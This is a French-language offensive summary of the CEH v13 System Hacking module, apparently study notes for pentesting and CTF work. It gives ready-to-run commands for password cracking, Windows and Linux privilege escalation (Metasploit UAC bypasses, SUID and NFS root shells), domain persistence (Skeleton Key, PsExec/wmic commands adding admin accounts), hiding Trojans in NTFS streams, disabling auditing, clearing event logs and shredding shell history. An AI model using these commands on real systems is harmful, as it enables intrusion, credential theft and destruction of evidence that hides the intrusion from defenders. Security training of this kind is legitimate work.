# CEH M06 - System Hacking (synthese offensive)

Source: `CEHv13 - Module 06 - System Hacking hide01.ir.pdf` (376 pages), OCR complet
(pipeline_progress.log confirme PIPELINE_ALL_DONE). Theorie d'examen/countermeasures omise
sauf quand directement reutilisable offensivement. Page = pagination du module lui-meme
("Module 06 Page NNN"), bruit OCR (watermark "hide01.ir", artefacts) ignore.

Structure du module: Gaining Access (p.4-141) -> Escalating Privileges (p.142-203) ->
Maintaining Access / Executing Applications (p.204-238) -> Hiding Files / Rootkits / ADS /
Steganographie (p.239-325) -> Clearing Logs / Covering Tracks (p.326-376).

## 1. Password cracking (Gaining Access)

### Classification des attaques (p.632-633)
- **Non-electronic**: shoulder surfing, social engineering, dumpster diving - zero outil.
- **Active online**: communication directe avec la cible - dictionary/brute-force/rule-based,
  password spraying, mask attack, hash injection (PtH), LLMNR/NBT-NS poisoning, Trojan/
  spyware/keylogger, internal monologue attack, Kerberoasting/AS-REP roasting, NTLM relay.
- **Passive online**: sniffing, MITM, replay - pas de contact direct, juste ecoute.
- **Offline**: on recupere le dump de hash et on casse localement/ailleurs - rainbow tables
  (hash pre-calcules), distributed network attack (p.519, p.576).

### Dump de hashs Windows (p.5, p.271-331)
- SAM (`%SystemRoot%\system32\config\SAM`) verrouille par le kernel tant que le systeme tourne
  -> impossible de copier le fichier a chaud en ligne; il faut dumper via un outil ou hors-ligne.
- Outils de dump: **pwdump7** (dump LM+NTLM depuis SAM, gere aussi les fichiers proteges),
  **Mimikatz**, **DSInternals**, **hashcat**, **PyCrack**.
- LM hash desactive par defaut depuis Vista+ (valeur "dummy"), ne pas perdre de temps sur LM
  sauf vieux systeme.

### John the Ripper (p.15, p.21-22)
```
# Generer une wordlist de variantes via les rules john.conf
john --wordlist=/path/to/rockyou.txt --rules --stdout > /path/to/output_wordlist.txt

# Cracker des hashs NTLM avec cette wordlist
john --rules --wordlist=/path/to/output_wordlist.txt --format=NT /path/to/ntlm_hashes.txt

# Afficher les mots de passe casses
john --show /path/to/ntlm_hashes.txt
```

### Hydra - bruteforce de service (p.23)
```
hydra -l admin -p password ftp://localhost/
hydra -L default_logins.txt -p test ftp://localhost/
hydra -l admin -P common_passwords.txt ftp://localhost/
hydra -L logins.txt -P passwords.txt ftp://localhost/
```

### hashcat (p.25-26)
```
hashcat -a 3 -m 0 md5_hashes.txt ?l?l?l?d?d?d        # brute-force masque (-a 3), mode MD5 (-m 0)
hashcat -m 0 -a 3 -i --increment-min=6 --increment-max=10 hashes.txt ?a?a?a?a?a?a?a?a?a?a
```
`-m` choisit le type de hash (ex: 0=MD5), `-a` le mode d'attaque (0=dictionnaire, 3=brute-force/
masque). Toujours identifier le format de hash exact avant de lancer (`hashcat --example-hashes`
en reflexe hors-module).

### Attaques Active Online avancees
- **Kerberoasting (p.878-911)**: demander un TGS pour un compte de service (SPN), extraire le
  ticket chiffre avec la cle derivee du mdp du service, puis casser hors-ligne avec
  **hashcat**/**John the Ripper**. Cible les comptes de service a privileges eleves.
- **AS-REP Roasting (p.1770-1902)**: cibler les comptes avec "Do not require Kerberos
  preauthentication" -> recuperer le TGT chiffre sans credential valide, puis cracker offline
  (hashcat/John) -> alternative a Kerberoasting qui ne demande aucun acces initial au compte.
- **Pass the Ticket (p.927-959)**: Mimikatz exporte/injecte un TGT Kerberos valide dans une
  session -> authentification sans connaitre le mot de passe. Outils: Mimikatz, Rubeus, Windows
  Credentials Editor.
- **NTLM Relay Attack (p.959-978)**: intercepter une requete d'authentification NTLM (poisoning
  reseau) et la relayer vers un autre service pour s'authentifier a la place de la victime.
  Outils: **Responder** (capture NetNTLMv2, ex sortie `SMB NTLMv2-SSP Hash`), **ntlmrelayx**,
  Metasploit.
- **Internal Monologue Attack (p.1704-1744)**: alternative furtive a Mimikatz qui n'extrait
  jamais le hash de LSASS (evite Credential Guard/AV) - via l'API SSPI en mode local on force
  un calcul NetNTLMv1 pour chaque utilisateur usurpe apres avoir abaisse `LMCompatibilityLevel`,
  `NTLMMinClientSec`, `RestrictSendingNTLMTraffic`, puis on restaure ces valeurs et on casse le
  hash NTLMv1 capture via rainbow tables.
- **Pass-the-Hash (p.1523-1622)**: injecter un hash LM/NTLM capture directement dans une session
  locale pour s'authentifier sans connaitre le mot de passe en clair - fonctionne contre tout
  systeme utilisant NTLM/LM pour l'auth (Windows, mais aussi Linux/autres via SMB).
- **Trojan/Spyware/Keylogger passif (p.1482-1522)**: installer un keylogger/spyware sur la
  machine cible pour recuperer les credentials en clair au moment de la frappe.

## 2. Escalade de privileges (p.142-203)

Deux familles: **horizontale** (acceder aux ressources d'un autre utilisateur de meme niveau)
et **verticale** (passer d'un compte faible privilege a admin/root) (p.7087-7097).

### Windows
- **DLL Hijacking (p.7110-7212)**: placer une DLL malveillante dans un chemin que l'app charge
  avant la vraie DLL (search order). Outils pour trouver les DLL "hijackable": **Spartacus**,
  **PowerSploit**.
- **Named Pipe Impersonation (p.7910-7956)**: exploiter l'impersonation de named pipes via
  Metasploit, puis `getsystem`/`getuid` pour obtenir NT AUTHORITY\SYSTEM.
- **UAC Bypass (p.8319, p.8512-8661)** - plusieurs modules Metasploit prets a l'emploi:
  ```
  msf > use exploit/windows/local/bypassuac              # injection generique
  msf > use exploit/windows/local/bypassuac_injection     # reflective DLL injection
  msf > use exploit/windows/local/bypassuac_fodhelper     # hijack cle HKCU via fodhelper.exe
  msf > use exploit/windows/local/bypassuac_eventvwr      # hijack cle HKCU via eventvwr.exe
  msf > use exploit/windows/local/bypassuac_comhijack     # hijack handler COM
  ```
  Puis `getsystem` / `getuid` pour confirmer le niveau obtenu.
- **Services mal configures (p.7991-8033)**: services tournant en SYSTEM avec un binaire/chemin
  modifiable par un utilisateur low-priv (chemin non quote + espace = "unquoted service path",
  mentionne p.8065) -> remplacer/planter un binaire malveillant sur le chemin de recherche.
- **Boot/Logon init scripts (p.8671-8766)**: abuser des scripts de logon (registre, GPO), du
  Startup Folder, ou de `rc.local`/`/Library/StartupItems` (macOS/Unix) pour escalader et
  persister au demarrage/connexion.
- **Recherche d'exploits locaux**: **Windows Exploit Suggester-NG (WES-NG)** croise la version
  OS/patch avec une base de CVE locales (p.3646-3668); sinon recherche manuelle sur
  **Exploit-DB** filtree sur "privilege escalation" (p.7529-7735).
- **Spectre/Meltdown (p.7815-7839)**: exploitation des vulnerabilites hardware de speculation
  pour lire de la memoire privilegiee depuis un contexte non privilegie.

### Linux
```
# Reconnaissance config cible pour choisir un kernel exploit
cat /etc/issue        # OS
uname -a              # version kernel
cat /proc/version     # architecture

# Rechercher l'exploit correspondant sur exploit-db.com, ou executer linprivchecker.py

# SUID / SGID abusables (spawn shell si bash/vim/nmap/less/more/cat/cp/echo/find/nano setuid)
find / -perm -u=s -type f 2>/dev/null   # SUID
find / -perm -g=s -type f 2>/dev/null   # SGID

# Abus de sudo (/etc/sudoers) - si un binaire autorise permet d'executer du code arbitraire
sudo -l

# Abus de cron (fichier /etc/crontab)
cat /etc/crontab
crontab -l             # crontabs en cours
crontab -e             # editer/injecter un job
crontab -r <user>      # supprimer la crontab d'un user (DoS/nettoyage de traces)
```
- **Abus du '.' dans PATH (p.188-189)**: si `.` est dans le PATH d'un utilisateur privilegie, on
  depose un script malveillant nomme comme une commande usuelle (`ls`, etc.) dans un repertoire
  qu'il controle -> execution a la place du binaire legitime quand ce user lance la commande.
- **Reco rapide post-shell (checklist Linux Post-Exploitation, p.937-938)**:
  ```
  find / -perm -4000 -ls 2>/dev/null                 # SUID
  find / -path /sys -prune -o -perm -o=w -type f -ls 2>/dev/null   # fichiers world-writable
  sudo -l
  ps -ef ; mount ; route -n ; cat /etc/crontab ; cat /etc/exports
  egrep -e '/bin/(ba)?sh' /etc/passwd                 # users avec shell
  cat ~/.ssh/*                                        # cles/relations SSH
  ```
- **Misconfigured NFS (p.8396-8495)**: monter un partage NFS expose sans restriction `root_squash`
  et copier un shell setuid:
  ```
  sudo apt-get install nfs-common
  sudo mount -t nfs <IP cible>:/<share> /tmp/nfs
  sudo cp /bin/bash /tmp/nfs/   # puis chmod +s depuis le partage -> shell root via NFS root
  ```

### macOS
- **Dylib Hijacking (p.7745-7804)**: equivalent DLL hijacking, outil **Dylib Hijack Scanner**.
- **Abus de l'API AuthorizationExecuteWithPrivileges (p.189)**: API cense demander des
  privileges root pour installer/mettre a jour du logiciel, sans verifier l'origine de la
  demande -> exploitable pour escalade + persistance.

### Active Directory (post-compromission d'un domaine)
- **Skeleton Key (p.15322-15404)**: injecter un mot de passe maitre universel sur un DC (via
  Mimikatz ou module Empire) qui fonctionne pour n'importe quel compte en plus du vrai mot de
  passe:
  ```
  (Empire: ) > usemodule powershell/persistence/misc/skeleton_key
  (Empire: ) > info
  ```
- **AdminSDHolder abuse (p.15742-15770)**: ajouter un ACE "GenericAll" sur l'objet AdminSDHolder
  -> le process SDProp (toutes les heures) le repropage automatiquement a tous les groupes
  proteges => persistance de domaine quasi invisible.
- **WMI Event Subscription persistence (p.15899-15964)**: creer une souscription WMI (Startup/
  Logon/etc.) qui declenche un payload -> **PowerLurk** / script **Wmi-Persistence**.
- **Remote Code Execution contre un DC via DPAPI/PsExec (p.15158-15229)**:
  ```
  PsExec.exe \\<DomainControllerName> -accepteula net localgroup "Admins" PiratedProcess /add
  wmic /node:<DomainControllerName> process call create "net user /add PiratedProcess Du**y01"
  ```

## 3. Keyloggers / Spyware (p.10157-10860)

- **Spyware**: capture ecran/activite, exfiltre vers un emplacement controle par l'attaquant,
  se cache des listes de process classiques.
- **Types de keylogger (p.10588-10759)**: hardware (PS/2, USB, Bluetooth, Wi-Fi, acoustique/CAM),
  application-level, kernel/rootkit-based (device driver falsifie, indetectable meme avec
  antivirus actif), hypervisor-based, form-grabbing (intercepte avant chiffrement HTTPS du
  formulaire), JavaScript-based, memory-injection-based.
- **Keylogger distant via Metasploit (p.10771-10842)**: module `lockout_keylogger` capture les
  frappes dans une session Meterpreter deja ouverte.

## 4. Rootkits (p.12125-12250+)

- Objectif: privileges root + furtivite en modifiant drivers/modules kernel et en masquant les
  process actifs. Technique coeur: **inline function hooking** - patcher les premiers octets
  d'une fonction core DLL (`kernel32.dll`, `ntdll.dll`) pour rediriger tout appel vers le code
  du rootkit (p.12250 ss), ou **DKOM** (Direct Kernel Object Manipulation) pour manipuler
  directement les structures noyau.
- Vecteur de depot classique: package le rootkit dans un faux jeu/installeur.
- **6 familles**: hypervisor-level (Ring-1, exploite Intel VT/AMD-V), hardware/firmware (BIOS,
  carte reseau - persiste meme apres reinstall OS), kernel-level (Ring 0, tres instable si bug),
  boot-loader-level/bootkit, application-level/user-mode, library-level, + memory/volatile
  rootkits (ne touchent jamais le disque, uniquement la RAM -> survivent mal au reboot mais
  tres difficiles a detecter en live forensics).
- **Rootkits reels cites**: **FudModule** (0-day admin->kernel via le driver AppLocker
  `appid.sys`, abuse l'IOCTL dispatcher pour appeler un pointeur arbitraire, tampering kernel
  depuis l'espace utilisateur), **Fire Chili** (exploite Log4Shell pour deployer, cree un
  service registre, telecharge des DLL malveillantes), + Reptile, Stealthy Universal Rootkit.

## 5. Steganographie (p.13364-13679)

- Principe: cacher un message dans un autre fichier sans alterer visiblement ce dernier (vs
  chiffrement qui cache le *contenu* mais pas l'*existence* du message).
- **Technique vs Linguistique**: technique = methodes physiques/scientifiques (encre invisible,
  microdots) ou numeriques (insertion/substitution de bits, techniques statistiques "1-bit stego
  masque"); linguistique = semagrams (polices/espacement) ou jargon codes.
- **Par support de couverture**: image, document, dossier (folder), video, audio, texte naturel,
  web/HTML, spam/email, OS cache, code source C++, **whitespace** (espaces en fin de ligne =
  canal discret dans du texte/code), donnees compressees.
- Usage offensif concret en CTF: fichier image/audio/pdf avec payload cache -> toujours tester
  `steghide`, `zsteg`, `binwalk`, `exiftool`, LSB extraction en plus de ce que le module nomme.

## 6. NTFS Alternate Data Streams - cacher des fichiers (p.13020-13300)

ADS planque des donnees dans un fichier existant sans changer sa taille apparente ni son
comportement dans l'explorateur de fichiers - indetectable par les outils de navigation natifs
(seul indice: timestamp de modification).

```
# Deplacer un executable dans un stream cache derriere un fichier anodin
C:\>type c:\Trojan.exe > c:\Readme.txt:Trojan.exe

# Creer un lien/raccourci pour executer le stream
C:\>mklink backdoor.exe Readme.txt:Trojan.exe

# Executer
C:\>backdoor.exe

# Lire/ecrire un stream cache (notepad est "stream compliant")
notepad myfile.txt:secret.txt
```
Detection defensive (utile aussi offensivement pour auditer une machine compromise): Sysinternals
**Streams**, **LADS**, **GMER**, **Stream Detector** - deplacer vers une partition FAT supprime
les ADS (le FAT ne les supporte pas).

## 7. Covering Tracks / Anti-forensics (p.326-376)

### Desactiver/effacer l'audit Windows
```
auditpol /set /category:"system","account logon" /success:disable   # couper l'audit avant action
auditpol /set /category:"system","account logon" /success:enable    # remettre apres (discretion)
auditpol /get /category:*                                            # voir la politique active
```

### Vider les logs
```
wevtutil el                      # lister les logs
wevtutil cl <nom_du_log>         # vider un log specifique

Clear-EventLog "Windows PowerShell"
Clear-EventLog -LogName ODiag, OSession -ComputerName <cible>
Clear-EventLog -LogName application, system -confirm
```
En session Meterpreter: commande `clearev` pour vider logs Windows en une commande.

### Linux - effacer l'historique shell
```
export HISTSIZE=0                                    # desactive l'historisation en cours
history -c                                            # vide l'historique memoire courant
history -w                                            # ecrit (vide) seulement le shell courant
cat /dev/null > ~/.bash_history && history -c && exit # vide fichier + memoire + quitte
shred ~/.bash_history                                 # rend le fichier illisible (anti-recovery)
shred ~/.bash_history && cat /dev/null > ~/.bash_history && history -c && exit
```
Penser aussi a `/var/log/` (auth.log, syslog, wtmp/utmp/btmp) pour une purge complete hors shell.

### Couverture reseau (p.341+)
- **Reverse HTTP shell**: la victime se comporte comme un client HTTP qui "demande" des
  commandes -> trafic ressemble a du surf normal, passe les perimetres DMZ/firewall standards.
- **Reverse ICMP tunneling**: encapsuler le payload TCP dans des paquets ICMP echo/reply - la
  plupart des firewalls filtrent l'ICMP entrant mais pas le sortant.
- **DNS tunneling**: encoder des donnees dans des requetes/reponses DNS pour creer un canal de
  sortie/exfiltration qui passe presque tous les firewalls applicatifs.
- **TCP covert channel**: cacher des donnees dans des champs TCP peu surveilles (IP Identification
  field, numero d'ACK, numero de sequence initial).

## 8. Execution distante / maintien d'acces (p.204-238)

- **PsExec**: execution de commande a distance via SMB avec credentials admin.
- **WMIC**: `wmic /node:<IP> /user:administrator /password:$PASS process call create "<cmd>"`
  (deplacement lateral + recon: `wmic /node:"" product get name,version,vendor` liste le
  logiciel installe a distance).
- **WinRM**: protocole natif Windows pour executer un binaire/payload a distance (port 5985
  HTTP / 5986 HTTPS), couple a SMB (port 135/445) pour le mouvement lateral.
- **schtasks / at**: planifier l'execution d'un payload au demarrage ou a heure fixe pour
  persister.
- **Netcat**: listener minimal pour recevoir un reverse shell:
  ```
  nc -lvp 4444          # cote attaquant, en ecoute avant de lancer le payload sur la cible
  ```
- **Backdoor pre-existant exploite tel quel**: exemple du module, VSFTPD 2.3.4 contenait une
  backdoor dans l'archive de distribution -> module Metasploit tout fait
  `exploit/unix/ftp/vsftpd_234_backdoor` (reflexe: toujours checker si la version exacte du
  service a une backdoor connue avant de chercher un exploit "normal").
- **Meterpreter**: une fois une session obtenue, pivoter (route add via la session), creer des
  listeners additionnels sur un port donne, et combiner avec les modules de persistence/privesc
  ci-dessus plutot que de retelecharger un autre outil.

## 9. Buffer overflow (mention rapide, p.4484-4596)

Deux familles rappelees dans Gaining Access: **stack-based** (ecraser l'adresse de retour via le
registre EIP pour rediriger l'execution) et **heap-based** (corrompre les structures de gestion
du tas pour detourner l'execution, plus complexe car pas d'adresse de retour directe a ecraser).
Pour l'exploitation detaillee (ROP, bypass canari/PIE/ASLR), se referer au skill `pwn-triage`
du repo plutot qu'a ce module (volontairement superficiel ici).

## Resume one-liner

Gaining Access = casser/voler un mot de passe (hashcat/John/Hydra/Mimikatz/Responder) avant de
chercher un 0-day -> Privesc = chercher SUID/sudo/cron/PATH (Linux) ou service/DLL/UAC
(Windows) avant un kernel exploit -> Maintenir l'acces = PsExec/WMIC/WinRM + persistence
registre/cron/WMI -> Couvrir les traces = auditpol/wevtutil/Clear-EventLog (Windows) ou
history/shred (Linux) + tunneling (HTTP/ICMP/DNS) pour le C2 furtif.
